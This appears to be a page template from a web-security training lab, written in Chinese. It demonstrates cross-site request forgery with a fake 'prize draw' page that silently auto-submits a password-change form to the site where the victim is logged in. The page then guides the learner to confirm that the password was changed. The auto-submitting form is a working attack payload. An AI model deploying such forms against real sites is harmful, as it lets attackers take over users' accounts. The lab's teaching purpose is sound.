恭喜你中奖了

这是一张攻击者放的「免费抽奖」页面。它看起来人畜无害，但页面一打开， 它就用你的浏览器去访问别处的接口了。

它正在干什么

<form action="{{ target }}" method="POST">
  <input type="hidden" name="new_password" value="{{ evil_password }}">
</form>
<script>document.forms[0].submit()</script>

注意它改的接口地址是 {{ target }} —— 和你刚才登录的个人中心是同一个站。浏览器会把你的 session cookie 一起带过去，服务端就以为是你本人在改密码。

手动触发：

接下来

  1. 回到 个人中心（如果弹出了新标签，那里面会直接显示改密码的结果）
  2. 按「退出」把自己退出去
  3. 再用 bob / password123 登录 —— 登不上了
  4. 试试用 {{ evil_password }} 当密码登录 —— 进去了

你从头到尾都没碰过「修改密码」那个按钮，密码却变了。这就是这一题要你体会的东西。
